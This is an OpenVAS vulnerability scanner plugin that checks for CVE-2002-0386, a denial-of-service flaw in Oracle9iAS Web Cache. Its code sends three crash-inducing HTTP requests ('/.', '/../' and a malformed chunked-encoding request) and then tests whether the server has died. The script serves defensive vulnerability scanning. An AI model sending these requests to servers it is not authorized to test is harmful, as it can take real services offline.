###############################################################################
# OpenVAS Vulnerability Test
# $Id: oracle9iAS_slashdot_DoS.nasl 6695 2017-07-12 11:17:53Z cfischer $
#
# Oracle webcache admin interface DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11076");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3765, 5902);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-0386");
  script_name("Oracle webcache admin interface DoS");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_require_ports("Services/www", 4000);
  script_dependencies("gb_get_http_banner.nasl", "httpver.nasl");
  script_mandatory_keys("OracleAS-Web-Cache/banner");

  script_xref(name:"URL", value:"http://www.atstake.com/research/advisories/2002/a102802-1.txt");
  script_xref(name:"URL", value:"http://otn.oracle.com/deploy/security/pdf/2002alert43rev1.pdf");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");

  script_tag(name:"summary", value:"It was possible to kill the web server by requesting '/.' or '/../',
  or sending an invalid request using chunked content encoding");

  script_tag(name:"impact", value:"An attacker may exploit this vulnerability to make your web server
  crash continually.");

  script_tag(name:"affected", value:"Oracle9iAS Web Cache/2.0.0.1.0");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:4000 );
banner = get_http_banner( port:port );
if( ! banner || "OracleAS-Web-Cache" >!< banner )
  exit( 0 );

if( http_is_dead( port:port ) )
  exit( 0 );

# The advisory says "GET /. HTTP/1.0" - however this won't get
# past some transparent proxies, so it's better to use http_get()

req = http_get( port:port, item:"/." );
res = http_send_recv( port:port, data:req );

req = http_get( port:port, item:"/../" );
res = http_send_recv( port:port, data:req );

req = http_get(port: port, item: "/");
req = req - '\r\n';
req = strcat( req, 'Transfer-Encoding: chunked\r\n\r\n' );
res = http_send_recv( port:port, data:req );

sleep( 1 ); # Is it really necessary ?

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );